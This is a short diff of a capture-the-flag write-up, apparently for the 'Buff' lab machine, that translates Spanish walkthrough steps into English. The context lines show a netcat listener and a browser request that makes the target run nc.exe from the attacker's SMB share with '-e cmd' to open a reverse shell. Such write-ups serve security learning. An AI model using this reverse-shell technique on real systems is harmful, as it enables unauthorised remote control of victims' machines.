@@ -160,11 +160,11 @@ Thus, we will see that the items that are part of the netcat folder will be list
 
 ![dir smb](https://github.com/0xLJoseb/Apuntes/blob/main/Buff%20Writeup/Content%26/dir%20smb.PNG)
 
-Ahora, en nuestro entorno de linux nos pondremos en escucha por el puerto [PORT]
+Now, in our linux environment, we will listen in on port [PORT]
 ```bash
 ...nc -lvnp [PORT]
 ```
-Así, vamos a pedir una "reverse shell" ejecutando en el buscador la siguiente petición:
+So, let's ask for a "reverse shell" by executing the following request in the browser:
 ```bash
 ...?telepathy=\\[Our IP]\smbFolder\nc.exe -e cmd [Our IP] [PORT]
 ```
